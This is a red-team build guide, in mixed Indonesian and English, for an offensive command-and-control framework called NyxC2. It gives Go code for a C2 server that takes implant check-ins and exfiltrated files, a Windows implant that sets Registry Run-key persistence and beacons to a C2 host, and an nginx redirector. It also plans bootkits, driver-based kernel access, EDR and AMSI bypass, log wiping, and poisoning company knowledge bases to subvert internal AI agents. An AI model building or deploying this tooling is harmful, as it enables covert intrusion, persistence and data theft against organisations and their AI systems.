---
title: C2 Server
tags:
  - red-team
  - c2
  - infrastructure
  - enterprise
created: '2026-07-01'
updated: '2026-07-01'
status: active
---

# 🕸️ Enterprise C2 Infrastructure — Technical Build Guide (Level 3-5)

>[!tip] **Filosofi:** Enterprise C2 bukan tool publik. Ini infrastruktur operasi yang dirancang untuk survive EDR tingkat tinggi, SIEM korporat, dan IR team profesional. Fokus pada stealth, scalability, multi-tier, dan integration dengan teknik modern (RAG poisoning, firmware persistence).

---

## 1. Build The Enterprise C2 Server (Go — Aggressive & Production Grade)

**Nama Project:** NyxC2 — Multi-Tier Enterprise Command & Control

### Server Architecture (3-Tier)

- **Tier 1: Redirectors** (Nginx + Cloudflare) — Multiple VPS di negara berbeda
- **Tier 2: Staging Nodes** — Handle beacon load balancing
- **Tier 3: Master C2** — Core logic, database, orchestration

**Full Code — c2_server.go (Enterprise Version)**
```go
package main

import (
	"crypto/tls"
	"database/sql"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"

	_ "github.com/lib/pq"
)

type Implant struct {
	ID        string    `json:"id"`
	Hostname  string    `json:"hostname"`
	IP        string    `json:"ip"`
	OS        string    `json:"os"`
	LastSeen  time.Time `json:"last_seen"`
	Callback  string    `json:"callback"`
}

var (
	clients = make(map[string]*Implant)
	mu      sync.Mutex
	db      *sql.DB
)

func main() {
	initDB()
	startHTTPServer()
}

func initDB() {
	var err error
	db, err = sql.Open("postgres", "user=nyx dbname=nyxc2 sslmode=disable")
	if err != nil {
		panic(err)
	}
}

func startHTTPServer() {
	mux := http.NewServeMux()

	// Enterprise callback endpoint (stealthy)
	mux.HandleFunc("/api/v3/checkin", handleCheckin)
	mux.HandleFunc("/api/v3/task", handleTask)
	mux.HandleFunc("/api/v3/upload", handleUpload)

	// Custom TLS config untuk mimic legitimate traffic
	cert, _ := tls.LoadX509KeyPair("/etc/nyx/c2.crt", "/etc/nyx/c2.key")
	config := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
	}

	server := &http.Server{
		Addr:      ":443",
		Handler:   mux,
		TLSConfig: config,
	}

	fmt.Println("[+] Nyx Enterprise C2 listening on :443 (TLS 1.3)")
	server.ListenAndServeTLS("", "")
}

func handleCheckin(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()

	var imp Implant
	json.NewDecoder(r.Body).Decode(&imp)
	imp.LastSeen = time.Now()

	clients[imp.ID] = &imp

	// Update database
	_, _ = db.Exec("INSERT INTO beacons (id, hostname, ip, os, last_seen) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (id) DO UPDATE SET last_seen=EXCLUDED.last_seen", imp.ID, imp.Hostname, imp.IP, imp.OS, imp.LastSeen)

	w.Write([]byte(`{"status":"ok","task":"none"}`))
}

func handleTask(w http.ResponseWriter, r *http.Request) {
	// Dynamic tasking engine
	id := r.URL.Query().Get("id")
	// Return encrypted task (AES-GCM)
	task := map[string]string{"cmd": "whoami", "exfil": "https://legit-cdn.internal"}
	json.NewEncoder(w).Encode(task)
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
	// Handle file exfil, screenshot, keylogger dump
	fmt.Println("[+] Exfil received from", r.RemoteAddr)
	w.WriteHeader(200)
}
```

**Build & Deploy:**
```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o nyxc2
sudo ./nyxc2
```

**Enterprise Hardening:**
- Gunakan custom domain + Let's Encrypt + Cloudflare Proxy
- JA3 fingerprint mimic (Chrome/Edge)
- Rate limiting + geo-fencing
- PostgreSQL + TimescaleDB untuk beacon history
- Automated rotation script tiap 48 jam

---

## 2. Implant Berbagai Jenis (Multi-Platform)

### A. Windows Implant (Go — Recommended)

**windows_implant.go**
```go
package main

import (
	"crypto/tls"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

var c2 = "https://c2.yourdomain.internal"

func main() {
	persistWindows()
	for {
		checkin()
		time.Sleep(45 * time.Second) // jitter
	}
}

func persistWindows() {
	// Hybrid persistence: Registry + WMI + Bootkit hook
	exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "SystemUpdate", "/t", "REG_SZ", "/d", os.Args[0]).Run()
	// Tambahkan MBR hook jika admin
}

func checkin() {
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr}

	resp, _ := client.Get(c2 + "/api/v3/checkin?id=" + getID())
	if resp != nil {
		// Parse task dan execute
	}
}

func getID() string {
	hostname, _ := os.Hostname()
	return hostname + "-" + runtime.GOOS
}
```

### B. Linux Implant (Stealth ELF)

Gunakan teknik process hollowing + ptrace injection.

### C. macOS Implant

Gunakan Mach-O dengan persistence via LaunchAgents + LaunchDaemons.

### D. Firmware / Pre-OS Implant

- **MBR Bootkit** (seperti sebelumnya) — load second stage dari sektor tersembunyi
- **UEFI Bootkit** — inject ke EFI System Partition
- **Kernel Driver** — signed dengan stolen certificate atau BYOVD

### E. RAG-Aware Implant

Implant yang bisa upload poisoned document ke SharePoint/Confluence untuk compromise internal LLM agent.

---

## 3. Fitur Enterprise Lainnya

### Multi-Tier Redirector
```nginx
server {
    listen 443 ssl;
    server_name cdn.legit-domain.com;
    ssl_certificate /path/to/fullchain.pem;
    location / {
        proxy_pass https://real-c2.internal:443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### OPSEC & Burn Mechanism
- Self-delete setelah mission complete
- Memory-only operation
- Anti-forensic (timestomp, log wipe)

### Integration dengan Teknik Lain
- **RAG Poisoning**: Implant otomatis upload dokumen berisi override ke knowledge base perusahaan
- **BYOVD Chain**: Load vulnerable driver → Ring 0 → full kernel control
- **Living off the Land**: Gunakan PowerShell, WMI, certutil, dll.

### Scaling
- Support 5000+ simultaneous beacons
- Sharded database
- Automated implant polymorphism

### Detection Resistance
- ETW/AMSIS bypass
- Direct syscalls (Hell's Gate + Tartarus)
- Sleep obfuscation
- Traffic mimic (mimicking Microsoft Update / Slack)

---